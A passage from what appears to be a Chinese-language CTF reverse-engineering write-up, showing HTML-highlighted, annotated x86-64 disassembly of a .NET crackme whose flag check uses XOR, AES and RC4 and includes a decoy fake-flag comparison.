class="hljs-string">&#x27;r2r&#x27;</span><br><span class="hljs-keyword">xor</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">test</span>    <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">ebx</span><br><span class="hljs-keyword">jle</span>     <span class="hljs-number">0x0123</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r12d</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> + <span class="hljs-number">8</span>]<br><span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">r12d</span>, <span class="hljs-built_in">ebx</span><br><span class="hljs-keyword">jl</span>      <span class="hljs-number">0x00d9</span><br><span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-built_in">rax</span> + <span class="hljs-number">16</span>]<br><span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">r14d</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">r8d</span>, <span class="hljs-built_in">dl</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> + <span class="hljs-built_in">rax</span> + <span class="hljs-number">16</span>], <span class="hljs-built_in">r8b</span> // 从 <span class="hljs-built_in">rdi</span> 数组读取字节，与 <span class="hljs-built_in">r14d</span> 异或，结果存储到 <span class="hljs-built_in">rbp</span> 数组<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">2164392969</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-keyword">imul</span>    <span class="hljs-built_in">r14d</span><br><span class="hljs-keyword">add</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">r14d</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r8d</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-keyword">shr</span>     <span class="hljs-built_in">r8d</span>, <span class="hljs-number">31</span><br><span class="hljs-keyword">sar</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">6</span><br><span class="hljs-keyword">add</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">r8d</span><br><span class="hljs-keyword">imul</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">edx</span>, <span class="hljs-number">127</span><br><span class="hljs-keyword">sub</span>     <span class="hljs-built_in">r14d</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-keyword">inc</span>     <span class="hljs-built_in">r14d</span> // <span class="hljs-built_in">r14d</span> += <span class="hljs-number">1</span><br><span class="hljs-keyword">inc</span>     <span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">jg</span>      <span class="hljs-number">0x009a</span><br><span class="hljs-built_in">RDI</span> is dead<br><span class="hljs-keyword">jmp</span>     <span class="hljs-number">0x0123</span><br><span class="hljs-built_in">RDI</span> is live<br><span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-built_in">rax</span> + <span class="hljs-number">16</span>]<br><span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">r14d</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">r8d</span>, <span class="hljs-built_in">al</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r12d</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> + <span class="hljs-number">8</span>]<br><span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">r12d</span><br><span class="hljs-keyword">jae</span>     <span class="hljs-number">0x03d5</span><br><span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> + <span class="hljs-built_in">rax</span> + <span class="hljs-number">16</span>], <span class="hljs-built_in">r8b</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">2164392969</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-keyword">imul</span>    <span class="hljs-built_in">r14d</span><br><span class="hljs-keyword">add</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">r14d</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-keyword">shr</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">31</span><br><span class="hljs-keyword">sar</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">6</span><br><span class="hljs-keyword">add</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-keyword">imul</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span>, <span class="hljs-number">127</span><br><span class="hljs-keyword">sub</span>     <span class="hljs-built_in">r14d</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-keyword">inc</span>     <span class="hljs-built_in">r14d</span><br><span class="hljs-keyword">inc</span>     <span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">jg</span>      <span class="hljs-number">0x00d9</span><br><span class="hljs-built_in">RDI</span> is dead<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r12d</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> + <span class="hljs-number">8</span>]<br><span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">r12d</span><br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">byte</span>[] (NEW_ARRAY)]<br><span class="hljs-built_in">RAX</span> is live<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-built_in">RCX</span> is live<br><span class="hljs-keyword">xor</span>     <span class="hljs-built_in">r8d</span>, <span class="hljs-built_in">r8d</span><br><span class="hljs-keyword">test</span>    <span class="hljs-built_in">r12d</span>, <span class="hljs-built_in">r12d</span><br><span class="hljs-keyword">jle</span>     <span class="hljs-number">0x01dc</span><br><span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span> + <span class="hljs-number">8</span>], <span class="hljs-built_in">r12d</span><br><span class="hljs-keyword">jl</span>      <span class="hljs-number">0x018b</span><br><span class="hljs-built_in">RAX</span> is dead<br><span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">r8d</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">r10d</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> + <span class="hljs-built_in">r9</span> + <span class="hljs-number">16</span>]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">1431655766</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-keyword">imul</span>    <span class="hljs-built_in">r8d</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-keyword">shr</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">31</span><br><span class="hljs-keyword">add</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rax</span> + <span class="hljs-number">2</span>*<span class="hljs-built_in">rax</span>]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">r8d</span><br><span class="hljs-keyword">sub</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">eax</span>  // <span class="hljs-built_in">r8d</span> % <span class="hljs-number">3</span><br><span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">3</span><br><span class="hljs-keyword">jae</span>     <span class="hljs-number">0x03d5</span><br><span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">r11d</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r15</span> + <span class="hljs-built_in">rax</span> + <span class="hljs-number">16</span>]  <br><span class="hljs-keyword">xor</span>     <span class="hljs-built_in">r10d</span>, <span class="hljs-built_in">r11d</span>  // 用 <span class="hljs-built_in">r15</span> 数组（<span class="hljs-number">3</span>字节）的相应字节异或，结果存储到新数组<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span> + <span class="hljs-built_in">r9</span> + <span class="hljs-number">16</span>], <span class="hljs-built_in">r10b</span><br><span class="hljs-keyword">inc</span>     <span class="hljs-built_in">r8d</span><br><span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">r12d</span>, <span class="hljs-built_in">r8d</span><br><span class="hljs-keyword">jg</span>      <span class="hljs-number">0x0145</span><br><span class="hljs-built_in">RBP</span> is dead<br><span class="hljs-built_in">R15</span> is dead<br><span class="hljs-keyword">jmp</span>     <span class="hljs-number">0x01dc</span><br><span class="hljs-built_in">R15</span> is live<br><span class="hljs-built_in">RBP</span> is live<br><span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">r8d</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">r10d</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> + <span class="hljs-built_in">rax</span> + <span class="hljs-number">16</span>]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">1431655766</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-keyword">imul</span>    <span class="hljs-built_in">r8d</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-keyword">shr</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">31</span><br><span class="hljs-keyword">add</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rax</span> + <span class="hljs-number">2</span>*<span class="hljs-built_in">rax</span>]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">r8d</span><br><span class="hljs-keyword">sub</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">3</span><br><span class="hljs-keyword">jae</span>     <span class="hljs-number">0x03d5</span><br><span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r15</span> + <span class="hljs-built_in">rax</span> + <span class="hljs-number">16</span>]<br><span class="hljs-keyword">xor</span>     <span class="hljs-built_in">r10d</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">r8d</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span> + <span class="hljs-number">8</span>]<br><span class="hljs-keyword">jae</span>     <span class="hljs-number">0x03d5</span><br><span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">r8d</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span> + <span class="hljs-built_in">rax</span> + <span class="hljs-number">16</span>], <span class="hljs-built_in">r10b</span><br><span class="hljs-keyword">inc</span>     <span class="hljs-built_in">r8d</span><br><span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">r12d</span>, <span class="hljs-built_in">r8d</span><br><span class="hljs-keyword">jg</span>      <span class="hljs-number">0x018b</span><br><span class="hljs-built_in">RBP</span> is dead<br><span class="hljs-built_in">R15</span> is dead<br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">byte</span>[] where<span class="hljs-number">.</span>QZoPKLYRExWdGJMn<span class="hljs-number">.</span>OXJTYZWRNQVKLPFm(<span class="hljs-built_in">byte</span>[]) (METHOD_ENTRY)] // AES<br><span class="hljs-built_in">RAX</span> is live<br><span class="hljs-built_in">RCX</span> is dead<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-built_in">RDI</span> is live<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-number">64</span> <br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">byte</span>[] (NEW_ARRAY)] // 创建 <span class="hljs-number">64</span> 字节数组<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rax</span>  // 保存到 <span class="hljs-built_in">rbx</span><br><span class="hljs-built_in">RBX</span> is live<br><span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rcx</span>, [<span class="hljs-number">0x3618</span>] 从地址偏移 <span class="hljs-number">0x3618</span> 处加载 <span class="hljs-number">64</span> 字节硬编码数据 -&gt;正确的密文<br><span class="hljs-keyword">movups</span>  <span class="hljs-built_in">xmm0</span>, xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>]<br><span class="hljs-keyword">movups</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbx</span> + <span class="hljs-number">16</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-keyword">movups</span>  <span class="hljs-built_in">xmm0</span>, xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span> + <span class="hljs-number">16</span>]<br><span class="hljs-keyword">movups</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbx</span> + <span class="hljs-number">32</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-keyword">movups</span>  <span class="hljs-built_in">xmm0</span>, xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span> + <span class="hljs-number">32</span>]<br><span class="hljs-keyword">movups</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbx</span> + <span class="hljs-number">48</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-keyword">movups</span>  <span class="hljs-built_in">xmm0</span>, xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span> + <span class="hljs-number">48</span>]<br><span class="hljs-keyword">movups</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbx</span> + <span class="hljs-number">64</span>], <span class="hljs-built_in">xmm0</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">8</span>]<br><span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-number">64</span> // 检查 <span class="hljs-built_in">rdi</span> 数组的长度是否为 <span class="hljs-number">64</span><br><span class="hljs-keyword">je</span>      <span class="hljs-number">0x0239</span><br><span class="hljs-built_in">RAX</span> is dead<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-string">&quot;Wrong!&quot;</span> (STRING_HANDLE)]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>]<br><span class="hljs-built_in">RCX</span> is live<br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [void System<span class="hljs-number">.</span>Console<span class="hljs-number">.</span>WriteLine(string) (METHOD_ENTRY)]<br><span class="hljs-built_in">RCX</span> is dead<br><span class="hljs-keyword">xor</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [void System<span class="hljs-number">.</span>Environment<span class="hljs-number">.</span>Exit(<span class="hljs-keyword">int</span>) (METHOD_ENTRY)]<br><span class="hljs-keyword">xor</span>     <span class="hljs-built_in">r14d</span>, <span class="hljs-built_in">r14d</span><br><span class="hljs-keyword">test</span>    <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">ebp</span><br><span class="hljs-keyword">jle</span>     <span class="hljs-number">0x02b0</span><br><span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-number">64</span><br><span class="hljs-keyword">jg</span>      <span class="hljs-number">0x0275</span><br><span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">r14d</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-built_in">rcx</span> + <span class="hljs-number">16</span>]<br><span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbx</span> + <span class="hljs-built_in">rcx</span> + <span class="hljs-number">16</span>] // 内容比较<br><span class="hljs-keyword">je</span>      <span class="hljs-number">0x026b</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-string">&quot;Wrong!&quot;</span> (STRING_HANDLE)]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>]<br><span class="hljs-built_in">RCX</span> is live<br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [void System<span class="hljs-number">.</span>Console<span class="hljs-number">.</span>WriteLine(string) (METHOD_ENTRY)]<br><span class="hljs-built_in">RCX</span> is dead<br><span class="hljs-keyword">xor</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [void System<span class="hljs-number">.</span>Environment<span class="hljs-number">.</span>Exit(<span class="hljs-keyword">int</span>) (METHOD_ENTRY)]<br><span class="hljs-keyword">inc</span>     <span class="hljs-built_in">r14d</span><br><span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">r14d</span><br><span class="hljs-keyword">jg</span>      <span class="hljs-number">0x0245</span><br><span class="hljs-built_in">RBX</span> is dead<br><span class="hljs-built_in">RDI</span> is dead<br><span class="hljs-keyword">jmp</span>     <span class="hljs-number">0x02b0</span><br><span class="hljs-built_in">RBX</span> is live<br><span class="hljs-built_in">RDI</span> is live<br><span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">r14d</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-built_in">rcx</span> + <span class="hljs-number">16</span>]<br><span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">r14d</span>, <span class="hljs-number">64</span><br><span class="hljs-keyword">jae</span>     <span class="hljs-number">0x03d5</span><br><span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">r14d</span><br><span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">cl</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbx</span> + <span class="hljs-built_in">rax</span> + <span class="hljs-number">16</span>]<br><span class="hljs-keyword">je</span>      <span class="hljs-number">0x02a8</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-string">&quot;Wrong!&quot;</span> (STRING_HANDLE)]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>]<br><span class="hljs-built_in">RCX</span> is live<br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [void System<span class="hljs-number">.</span>Console<span class="hljs-number">.</span>WriteLine(string) (METHOD_ENTRY)]<br><span class="hljs-built_in">RCX</span> is dead<br><span class="hljs-keyword">xor</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [void System<span class="hljs-number">.</span>Environment<span class="hljs-number">.</span>Exit(<span class="hljs-keyword">int</span>) (METHOD_ENTRY)]<br><span class="hljs-keyword">inc</span>     <span class="hljs-built_in">r14d</span><br><span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">r14d</span><br><span class="hljs-keyword">jg</span>      <span class="hljs-number">0x0275</span><br><span class="hljs-built_in">RDI</span> is dead<br><span class="hljs-built_in">RBX</span> is dead<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-string">&quot;Right!&quot;</span> (STRING_HANDLE)]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>]<br><span class="hljs-built_in">RCX</span> is live<br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [void System<span class="hljs-number">.</span>Console<span class="hljs-number">.</span>WriteLine(string) (METHOD_ENTRY)]<br><span class="hljs-built_in">RCX</span> is dead<br><span class="hljs-keyword">xor</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [void System<span class="hljs-number">.</span>Environment<span class="hljs-number">.</span>Exit(<span class="hljs-keyword">int</span>) (METHOD_ENTRY)]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-string">&quot;flag&#123;i_am_the_true_flag&#125;&quot;</span> (STRING_HANDLE)] // 假逻辑<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span>]<br><span class="hljs-built_in">RDX</span> is live<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-built_in">RCX</span> is live<br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [bool System<span class="hljs-number">.</span>String<span class="hljs-number">.</span>op_Equality(string, string) (METHOD_ENTRY)]<br><span class="hljs-built_in">RCX</span> is dead<br><span class="hljs-built_in">RDX</span> is dead<br><span class="hljs-keyword">test</span>    <span class="hljs-built_in">al</span>, <span class="hljs-built_in">al</span><br><span class="hljs-keyword">je</span>      <span class="hljs-number">0x02f1</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-string">&quot;Right!&quot;</span> (STRING_HANDLE)]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>]<br><span class="hljs-built_in">RCX</span> is live<br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [void System<span class="hljs-number">.</span>Console<span class="hljs-number">.</span>WriteLine(string) (METHOD_ENTRY)]<br><span class="hljs-built_in">RCX</span> is dead<br><span class="hljs-keyword">jmp</span>     <span class="hljs-number">0x0301</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-string">&quot;Wrong!&quot;</span> (STRING_HANDLE)]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>]<br><span class="hljs-built_in">RCX</span> is live<br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [void System<span class="hljs-number">.</span>Console<span class="hljs-number">.</span>WriteLine(string) (METHOD_ENTRY)]<br><span class="hljs-built_in">RCX</span> is dead<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-number">3</span><br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">byte</span>[] (NEW_ARRAY)]<br><span class="hljs-built_in">RAX</span> is live<br><span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rcx</span>, [<span class="hljs-number">0x36b0</span>]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dx</span>, <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">16</span>], <span class="hljs-built_in">dx</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dl</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span> + <span class="hljs-number">2</span>]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">18</span>], <span class="hljs-built_in">dl</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-built_in">RCX</span> is live<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-built_in">RDX</span> is live<br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">byte</span>[] where<span class="hljs-number">.</span>rc4<span class="hljs-number">.</span>ToRC4(string, <span class="hljs-built_in">byte</span>[]) (METHOD_ENTRY)]<br><span class="hljs-built_in">RDX</span> is dead<br><span class="hljs-built_in">RSI</span> is dead<br><span class="hljs-built_in">RCX</span> is dead<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-built_in">RSI</span> is live<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-number">64</span><br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">byte</span>[] (NEW_ARRAY)]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-built_in">RDI</span> is live<br><span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rcx</span>, [<span class="hljs-number">0x37c0</span>]<br><span class="hljs-keyword">movups</span>  <span class="hljs-built_in">xmm0</span>, xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>]<br><span class="hljs-keyword">movups</span>  xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">16</span>], <span 